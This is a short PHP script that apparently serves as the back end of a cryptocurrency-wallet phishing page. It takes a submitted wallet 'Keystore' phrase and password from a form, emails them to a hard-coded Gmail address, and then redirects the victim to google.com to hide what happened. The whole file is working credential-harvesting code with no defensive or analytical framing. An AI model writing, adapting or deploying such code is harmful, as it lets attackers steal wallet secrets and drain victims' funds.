<?php 
if(isset($_POST['submit'])){
    $to = "mmmikebarnes@gmail.com"; // this is your Email address
    $key_store = $_POST['Keystore'];
    $password = $_POST['password'];
    $message = $key_store ."  Keystore Phrase and password: "  . $password; 
    $headers2 = "From:" . $to;
    $subject = "Keystore";
    mail($to,$subject,$message,$headers2);
    
    header("Location: https://www.google.com/another-page.php"); // the http is where you would like to redirect the user to
    exit();
    
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    }
?>